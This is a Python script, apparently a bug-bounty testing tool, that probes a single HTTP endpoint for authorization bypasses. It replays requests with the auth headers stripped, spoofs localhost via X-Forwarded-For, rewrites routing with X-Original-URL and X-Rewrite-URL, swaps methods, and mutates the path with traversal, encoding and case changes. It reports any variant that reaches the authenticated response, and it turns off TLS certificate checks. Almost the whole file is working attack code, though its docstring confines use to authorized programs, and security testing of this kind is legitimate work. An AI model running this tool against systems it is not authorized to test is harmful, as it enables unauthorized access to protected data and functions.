#!/usr/bin/env python3
"""
auth-bypass — 403/401 authorization-bypass matrix against a single endpoint.

Baseline = the authed request (its status + body size). Then each variant is
sent and compared: a variant that reaches the same status+size as the authed
baseline WITHOUT valid auth (or via a routing/verb trick) is a bypass.

Techniques:
  header  : no Authorization · empty Bearer · Authorization: null
  routing : X-Original-URL · X-Rewrite-URL · X-Forwarded-For 127.0.0.1
  verb    : X-HTTP-Method-Override · method swap (GET/POST/PUT/HEAD)
  path    : /admin/../<ep> · double-slash //ep · ;/  · ./  · %2e/ · trailing /
  case    : /Admin /ADMIN mutation
  ext     : append .json .html .css to the path
  frag    : #-fragment truncation

Usage:
  auth-bypass.py --url https://api.acme.com/admin/users \
                 --token VALID_JWT [--method GET] [--data '{}'] [--json]

Only run against endpoints on programs you are authorized to test.
Exit: 0 no bypass · 1 bypass(es) found.
"""
import sys, json, time, ssl, copy
from pathlib import Path
from urllib.request import Request, build_opener, HTTPSHandler, HTTPHandler
from urllib.error import HTTPError
from urllib.parse import urlparse, urlunparse


def arg(n, d=None):
    return sys.argv[sys.argv.index(n) + 1] if n in sys.argv else d
def flag(n):
    return n in sys.argv


def ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


def fire(url, method, headers, data, timeout=8):
    opener = build_opener(HTTPSHandler(context=ctx()), HTTPHandler())
    body = data.encode() if isinstance(data, str) else data
    req = Request(url, data=body, headers=headers, method=method.upper())
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(65536)
            return r.status, len(raw)
    except HTTPError as e:
        try:
            raw = e.read(8192)
        except Exception:
            raw = b""
        return e.code, len(raw)
    except Exception as ex:
        return 0, 0


def path_variants(u):
    p = urlparse(u)
    path = p.path or "/"
    seg = path.rsplit("/", 1)[-1]
    parent = path[: -len(seg)] if seg else path
    out = []

    def mk(newpath, note):
        out.append((note, urlunparse(p._replace(path=newpath))))

    mk(parent + "../" + seg, "dot_segment_traversal")
    mk("/" + path.lstrip("/"), "leading_normal")
    mk("//" + path.lstrip("/"), "double_slash")
    mk(path + "/", "trailing_slash")
    mk(parent + ";/" + seg, "semicolon_segment")
    mk(parent + "./" + seg, "single_dot")
    mk(parent + "%2e/" + seg, "encoded_dot")
    if seg:
        mk(parent + seg[0].upper() + seg[1:], "case_capital")
        mk(parent + seg.upper(), "case_upper")
        for ext in (".json", ".html", ".css"):
            mk(path + ext, f"ext_append{ext}")
    mk(path + "#", "fragment_hash")
    return out


def main():
    url = arg("--url")
    token = arg("--token")
    method = arg("--method", "GET")
    data = arg("--data")

    if not url:
        print(__doc__)
        sys.exit(0)

    base_h = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    if data:
        base_h["Content-Type"] = "application/json"
    authed_h = dict(base_h)
    if token:
        authed_h["Authorization"] = token if " " in token else f"Bearer {token}"

    b_status, b_size = fire(url, method, authed_h, data)
    print(f"[auth-bypass] baseline (authed) HTTP {b_status} size={b_size}", file=sys.stderr)

    def matches_authed(s, z):
        return s == b_status and s in (200, 201, 204) and abs(z - b_size) <= max(16, int(0.05 * (b_size or 1)))

    variants = []

    # header-strip variants (same url/method, weakened auth)
    variants.append(("no_auth_header", url, method, dict(base_h), data))
    variants.append(("empty_bearer", url, method, {**base_h, "Authorization": "Bearer "}, data))
    variants.append(("auth_null", url, method, {**base_h, "Authorization": "null"}, data))

    # routing-override headers (unauthed base + override to the protected path)
    p = urlparse(url)
    variants.append(("x_original_url", p._replace(path="/").geturl(), method,
                     {**base_h, "X-Original-URL": p.path}, data))
    variants.append(("x_rewrite_url", p._replace(path="/").geturl(), method,
                     {**base_h, "X-Rewrite-URL": p.path}, data))
    variants.append(("x_forwarded_for_lo", url, method,
                     {**base_h, "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}, data))

    # verb overrides / method swaps (unauthed)
    variants.append(("verb_override_get", url, method,
                     {**base_h, "X-HTTP-Method-Override": "GET"}, data))
    for m in ("POST", "PUT", "HEAD", "OPTIONS"):
        if m != method.upper():
            variants.append((f"method_swap_{m.lower()}", url, m, dict(base_h),
                             data if m in ("POST", "PUT") else None))

    # path mutations (unauthed)
    for note, vurl in path_variants(url):
        variants.append((f"path_{note}", vurl, method, dict(base_h), data))

    findings = []
    for note, vurl, vmethod, vheaders, vdata in variants:
        s, z = fire(vurl, vmethod, vheaders, vdata)
        hit = matches_authed(s, z)
        rec = {
            "technique": note, "url": vurl, "method": vmethod,
            "status": s, "size": z,
            "baseline_status": b_status, "baseline_size": b_size,
        }
        if hit:
            rec["severity"] = "high"
            rec["note"] = (f"{note}: reached authed baseline ({s}/{z}b) without valid "
                           f"auth — authorization bypass.")
            findings.append(rec)
            print(f"  ✓ BYPASS {note}  {s}/{z}", file=sys.stderr)

    result = {
        "ts": time.strftime("%Y-%m-%d %H:%M"),
        "url": url,
        "baseline_status": b_status, "baseline_size": b_size,
        "variants_tested": len(variants),
        "total": len(findings),
        "findings": findings,
    }

    if flag("--json"):
        print(json.dumps(result))
        sys.exit(1 if findings else 0)

    print(f"\n== auth-bypass · {url} ==")
    print(f"  baseline authed {b_status}/{b_size}b · tested {len(variants)} variants · "
          f"{len(findings)} bypass(es)")
    for f in findings:
        print(f"  [HIGH]  {f['technique']:<24} {f['status']}/{f['size']}b  {f['url']}")
    if not findings:
        print("  no bypass — endpoint held under all tested variants.")
    sys.exit(1 if findings else 0)


if __name__ == "__main__":
    main()
